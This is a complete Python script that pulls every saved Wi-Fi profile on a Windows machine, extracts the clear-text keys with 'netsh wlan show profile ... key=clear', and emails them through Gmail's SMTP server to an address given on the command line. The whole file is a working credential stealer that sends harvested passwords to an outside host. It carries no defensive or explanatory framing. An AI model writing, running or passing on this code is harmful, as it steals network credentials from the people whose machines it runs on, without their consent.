import subprocess, smtplib, re, sys

def usage():
  print("[+] Usage of the script")
  print("[+] python response.py <From emailID> <password> <to emailID>")
  sys.exit()

def send_mails(from_email, password, to_email, msg):
  try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    print("Server instance created")
    server.starttls()
    print("started servertls")
    server.login(from_email, password)
    print("logged-in")
    msg = "Subject: Wifi keys\n\n{}".format(msg)
    server.sendmail(from_email, to_email, msg)
    print("mail sent to {sent} from {From}".format(From=from_email, sent=to_email))
    server.quit()
    print("logged out")
  except Exception as error:
    print("Exception occured while sending mails\n")
    print(error)
    sys.exit()

command = "netsh wlan show profile"
final_result = ''

if len(sys.argv) != 4:
  usage()

else:
  try:
    networks = subprocess.check_output(command, shell=True)
    networks = networks.decode()
    network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
    for network in network_names:
      d = network.split()
      network = "*".join(d)
      command = "netsh wlan show profile {} key=clear".format(network)
      network_output = subprocess.check_output(command, shell=True).decode()
      final_result += network_output
    send_mails(from_email=sys.argv[1], password=sys.argv[2],to_email=sys.argv[3], msg=final_result)
  except subprocess.SubprocessError as error:
    print(error)